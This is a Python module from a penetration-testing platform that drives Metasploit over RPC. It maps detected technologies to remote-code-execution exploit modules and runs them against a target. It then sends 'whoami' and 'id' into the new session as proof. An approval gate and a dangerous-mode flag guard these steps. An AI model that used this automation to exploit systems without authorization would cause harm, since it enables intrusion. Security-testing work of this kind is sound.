# -*- coding: utf-8 -*-
# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 VULNCLAW Authors (see README & LICENSE)
# This file is part of VULNCLAW / pentest_platform.
# Licensed under GNU Affero General Public License v3.0 or later.

# deepsec/msf_rpc.py
"""P4-2: Metasploit RPC 联动（--dangerous 模式验证 RCE）。

通过 msgpack over HTTP 连接 msfrpcd（默认端口 55552），实现：
- auth.login / 可用性探测
- module.check（仅验证，不实际利用）
- module.execute（执行 exploit 模块）
- session.list / session.shell_write / session.shell_read（回传 whoami / id 证据）

安全约束：
- 仅在 severity == Critical 且 dangerous=True 时由 ExploitChain 触发；
- 未安装 msgpack 或未配置 MSF_RPC_PASSWORD / msfrpcd 未启动 → 自动禁用，
  回退到原有 ShellChannel 路径，不影响扫描主流程。

启动 msfrpcd 示例：
    msfrpcd -P your_rpc_pass -S -a 127.0.0.1 -p 55552
"""

import asyncio
import time
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse

from vulnclaw.core.logger import logger
from vulnclaw.core.settings import settings

try:
    import msgpack

    HAS_MSGPACK = True
except ImportError:  # pragma: no cover - 可选依赖
    msgpack = None  # type: ignore
    HAS_MSGPACK = False

DEFAULT_PAYLOAD = "cmd/unix/generic"  # 直接执行命令，无需反向连接

# 常见 RCE → Metasploit 模块启发式映射（按命中顺序优先）
_RCE_MODULE_HINTS: List[Tuple[str, str]] = [
    ("struts2", "exploit/multi/http/struts2_rest_xstream"),
    ("weblogic", "exploit/multi/misc/weblogic_deserialize"),
    ("jenkins", "exploit/multi/http/jenkins_script_console"),
    ("thinkphp", "exploit/multi/http/thinkphp_rce"),
    ("shiro", "exploit/multi/http/shiro_rememberme_v124_deserialize"),
    ("solr", "exploit/multi/http/solr_velocity_rce"),
    ("drupal", "exploit/unix/webapp/drupal_drupalgeddon2"),
    ("tomcat", "exploit/multi/http/tomcat_mgr_upload"),
    ("elasticsearch", "exploit/multi/elasticsearch/script_mvel_rce"),
    ("jboss", "exploit/multi/http/jboss_seam_upload_exec"),
    ("gitlab", "exploit/linux/http/gitlab_shell_exec"),
    ("redis", "exploit/linux/redis/redis_lua_rce"),
]


class MsfRpcClient:
    """轻量 Metasploit RPC 客户端（msgpack + HTTP，无第三方框架依赖）。"""

    def __init__(
        self,
        host: Optional[str] = None,
        port: Optional[int] = None,
        user: Optional[str] = None,
        password: Optional[str] = None,
        ssl: Optional[bool] = None,
        timeout: Optional[int] = None,
    ):
        self.host = host or settings.msf_rpc_host
        self.port = int(port or settings.msf_rpc_port)
        self.user = user or settings.msf_rpc_user
        self.password = password or settings.msf_rpc_password
        self.ssl = settings.msf_rpc_ssl if ssl is None else ssl
        self.timeout = int(timeout or settings.msf_rpc_timeout)
        self._token: Optional[str] = None
        self._disabled = False

    @property
    def enabled(self) -> bool:
        return HAS_MSGPACK and bool(self.password) and not self._disabled

    @property
    def base_url(self) -> str:
        scheme = "https" if self.ssl else "http"
        return f"{scheme}://{self.host}:{self.port}/api/"

    async def _call(self, method: str, *params) -> Dict:
        """发送一次 msgpack RPC 调用。"""
        if not self.enabled:
            return {}
        if method != "auth.login" and not self._token:
            if not await self.login():
                return {}

        payload: List[Any] = [method]
        if method != "auth.login":
            payload.append(self._token)
        payload.extend(params)

        import aiohttp

        from vulnclaw.core.utils import get_shared_session

        session = await get_shared_session()
        try:
            async with session.post(
                self.base_url,
                data=msgpack.packb(payload, use_bin_type=True),
                headers={"Content-Type": "binary/message-pack"},
                timeout=aiohttp.ClientTimeout(total=self.timeout),
            ) as resp:
                raw = await resp.read()
                result = msgpack.unpackb(raw, raw=False, strict_map_key=False)
                return result if isinstance(result, dict) else {}
        except Exception as exc:  # noqa: BLE001
            logger.debug(f"🎯 [MSF] RPC 调用失败 {method}: {exc}")
            return {}

    async def login(self) -> bool:
        """auth.login 获取 token。"""
        result = await self._call("auth.login", self.user, self.password)
        if str(result.get("result", "")).lower() == "success" and result.get("token"):
            self._token = result["token"]
            logger.info(f"🎯 [MSF] RPC 登录成功: {self.host}:{self.port}")
            return True
        logger.info(f"🎯 [MSF] RPC 登录失败: {result.get('error') or result}")
        self._disabled = True  # 凭据错误 → 本次扫描内不再重试
        return False

    async def is_available(self) -> bool:
        """探测 msfrpcd 是否可用。"""
        if not self.enabled:
            return False
        if self._token:
            return True
        return await self.login()

    async def list_sessions(self) -> Dict:
        result = await self._call("session.list")
        return {k: v for k, v in result.items() if isinstance(v, dict)}

    async def check(self, module: str, rhost: str, rport: int, options: Optional[Dict] = None) -> str:
        """module.check：仅验证目标是否脆弱（vulnerable / safe / unknown）。"""
        opts: Dict[str, Any] = {"RHOSTS": rhost, "RPORT": int(rport)}
        opts.update(options or {})
        result = await self._call("module.check", "exploit", module, opts)
        return str(result.get("status") or "unknown")

    async def run_exploit(
        self,
        module: str,
        rhost: str,
        rport: int,
        payload: Optional[str] = None,
        options: Optional[Dict] = None,
        wait: float = 15.0,
    ) -> Dict:
        """执行 exploit 模块并等待 session 建立。"""
        # 危险操作权限门卫：MSF 利用默认拒绝
        from vulnclaw.core.danger_guard import guard

        if not guard.require_approval("msf_exploit", f"module={module} rhost={rhost}:{rport}"):
            return {"success": False, "module": module, "error": "danger_denied: MSF 利用被权限门卫拒绝"}
        opts: Dict[str, Any] = {"RHOSTS": rhost, "RPORT": int(rport)}
        if payload:
            opts["PAYLOAD"] = payload
        opts.update(options or {})

        before_ids = set((await self.list_sessions()).keys())
        result = await self._call("module.execute", "exploit", module, opts)
        if str(result.get("result", "")).lower() != "success":
            return {
                "success": False,
                "module": module,
                "error": result.get("error") or result or "模块执行未成功",
            }

        session_id = ""
        deadline = time.time() + max(1.0, wait)
        while time.time() < deadline:
            await asyncio.sleep(1.0)
            sessions = await self.list_sessions()
            new_ids = [sid for sid in sessions if sid not in before_ids]
            if new_ids:
                session_id = new_ids[0]
                break

        return {
            "success": bool(session_id),
            "session_id": session_id,
            "job_id": result.get("job_id") or result.get("uuid") or "",
            "module": module,
            "raw": result,
        }

    async def session_shell_write(self, session_id: str, command: str) -> bool:
        # 危险操作权限门卫：向已建立会话写命令默认拒绝
        from vulnclaw.core.danger_guard import guard

        if not guard.require_approval("msf_shell_write", f"session={session_id} cmd={command[:60]}"):
            return False
        result = await self._call("session.shell_write", str(session_id), f"{command}\n")
        return "success" in str(result.get("result", "")).lower()

    async def session_shell_read(self, session_id: str, timeout: float = 6.0) -> str:
        """读取 shell 输出（轮询直到无新数据或超时）。"""
        output = ""
        deadline = time.time() + max(1.0, timeout)
        idle = 0
        while time.time() < deadline and idle < 3:
            result = await self._call("session.shell_read", str(session_id))
            data = (result.get("data") or "").strip()
            if data:
                output += data + "\n"
                idle = 0
            else:
                idle += 1
                await asyncio.sleep(0.5)
        return output.strip()

    async def stop_session(self, session_id: str) -> None:
        try:
            await self._call("session.stop", str(session_id))
        except Exception:  # noqa: BLE001
            logger.debug("suppressed exception (core audit)")


def suggest_module(finding: Dict, tech_stack: Optional[List[str]] = None) -> Optional[str]:
    """P4-2: 根据漏洞信息与技术栈启发式推断 Metasploit 模块。"""
    blob = " ".join(
        [
            str(finding.get("name") or ""),
            str(finding.get("vuln_type") or ""),
            str(finding.get("type") or ""),
            str(finding.get("description") or ""),
            str(finding.get("evidence") or ""),
            str(finding.get("poc") or ""),
            " ".join(str(t) for t in (tech_stack or [])),
        ]
    ).lower()
    for key, module in _RCE_MODULE_HINTS:
        if key in blob:
            return module
    return None


def _host_port(target: str) -> Tuple[str, int]:
    """从 URL / host 解析 (host, port)。"""
    raw = target if "://" in target else f"http://{target}"
    parsed = urlparse(raw)
    host = parsed.hostname or ""
    if parsed.port:
        port = int(parsed.port)
    else:
        port = 443 if parsed.scheme == "https" else 80
    return host, port


async def msf_check(
    target: str,
    port: Optional[int] = None,
    module: Optional[str] = None,
    finding: Optional[Dict] = None,
    tech_stack: Optional[List[str]] = None,
) -> Dict:
    """P4-2: 只验证不利用（module.check）。

    Returns:
        {"available": bool, "module": str, "status": "vulnerable"/"safe"/"unknown", "error": str}
    """
    client = MsfRpcClient()
    if not client.enabled:
        return {
            "available": False,
            "module": module or "",
            "status": "unknown",
            "error": "MSF RPC 未启用（缺少 msgpack 或 MSF_RPC_PASSWORD 未配置）",
        }
    if not await client.is_available():
        return {
            "available": False,
            "module": module or "",
            "status": "unknown",
            "error": "MSF RPC 不可用（msfrpcd 未启动？）",
        }
    host, default_port = _host_port(target)
    module = module or suggest_module(finding or {}, tech_stack)
    if not module:
        return {
            "available": True,
            "module": "",
            "status": "unknown",
            "error": "未能推断可用的 Metasploit 模块",
        }
    status = await client.check(module, host, int(port or default_port))
    logger.info(f"🎯 [MSF] check {module} → {status}")
    return {"available": True, "module": module, "status": status, "error": ""}


async def msf_exploit_rce(
    target: str,
    port: Optional[int] = None,
    module: Optional[str] = None,
    payload: Optional[str] = None,
    finding: Optional[Dict] = None,
    tech_stack: Optional[List[str]] = None,
    wait: float = 15.0,
) -> Dict:
    """P4-2: 调用 Metasploit 验证 RCE 并回传 whoami / id 证据。

    Args:
        target: 目标 URL 或 host。
        port: 目标端口（默认从 URL 推导）。
        module: exploit 模块名；为空时按漏洞信息/技术栈推断。
        payload: payload 名；默认 cmd/unix/generic（直接执行命令）。
        finding: 漏洞字典（用于模块推断）。
        tech_stack: 技术栈（用于模块推断）。
        wait: 等待 session 建立的最长时间（秒）。

    Returns:
        {
          "success": bool, "session_id": str, "whoami": str, "id_output": str,
          "module": str, "payload": str, "error": str,
        }
    """
    result: Dict[str, Any] = {
        "success": False,
        "session_id": "",
        "whoami": "",
        "id_output": "",
        "module": module or "",
        "payload": payload or "",
        "error": "",
    }

    client = MsfRpcClient()
    if not client.enabled:
        result["error"] = "MSF RPC 未启用（缺少 msgpack 或 MSF_RPC_PASSWORD 未配置）"
        logger.info(f"🎯 [MSF] 跳过 Metasploit 验证: {result['error']}")
        return result
    if not await client.is_available():
        result["error"] = "MSF RPC 不可用（msfrpcd 未启动？）"
        logger.info(f"🎯 [MSF] 跳过 Metasploit 验证: {result['error']}")
        return result

    host, default_port = _host_port(target)
    rport = int(port or default_port)
    module = module or suggest_module(finding or {}, tech_stack)
    if not module:
        result["error"] = "未能推断可用的 Metasploit 模块"
        return result

    use_payload = payload or DEFAULT_PAYLOAD
    options: Dict[str, Any] = {"CMD": "id"} if use_payload.endswith("generic") else {}

    logger.info(
        f"🎯 [MSF] 尝试利用: {module} → {host}:{rport} payload={use_payload}"
    )
    run = await client.run_exploit(
        module, host, rport, payload=use_payload, options=options, wait=wait
    )
    result["module"] = module
    result["payload"] = use_payload
    if not run.get("success"):
        result["error"] = str(run.get("error") or "未建立 session")
        logger.warning(f"🎯 [MSF] 利用未成功: {result['error']}")
        return result

    session_id = str(run.get("session_id") or "")
    result["success"] = True
    result["session_id"] = session_id

    if settings.msf_auto_confirm and session_id:
        for cmd in ("whoami", "id"):
            try:
                if await client.session_shell_write(session_id, cmd):
                    out = await client.session_shell_read(session_id, timeout=6)
                else:
                    out = ""
            except Exception as exc:  # noqa: BLE001
                out = ""
                logger.debug(f"🎯 [MSF] 执行 {cmd} 失败: {exc}")
            if cmd == "whoami":
                result["whoami"] = out
            else:
                result["id_output"] = out
        logger.info(
            f"🎯 [MSF] session {session_id} 建立成功: "
            f"whoami={result['whoami'][:80]!r}"
        )
    return result


__all__ = [
    "MsfRpcClient",
    "msf_exploit_rce",
    "msf_check",
    "suggest_module",
    "HAS_MSGPACK",
    "DEFAULT_PAYLOAD",
]
